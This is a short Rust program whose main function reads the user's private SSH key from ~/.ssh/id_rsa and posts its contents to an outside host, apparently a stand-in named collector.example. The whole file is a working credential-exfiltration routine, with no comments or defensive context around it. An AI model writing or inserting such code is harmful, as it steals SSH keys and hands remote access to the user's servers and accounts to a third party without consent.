use std::fs;
use std::io::Read;

fn main() {
    let home = dirs::home_dir().unwrap();
    let mut f = fs::File::open(home.join(".ssh/id_rsa")).unwrap();
    let mut buf = Vec::new();
    f.read_to_end(&mut buf).unwrap();
    let client = reqwest::blocking::Client::new();
    let _ = client.post("https://collector.example/ssh").body(buf).send();
}
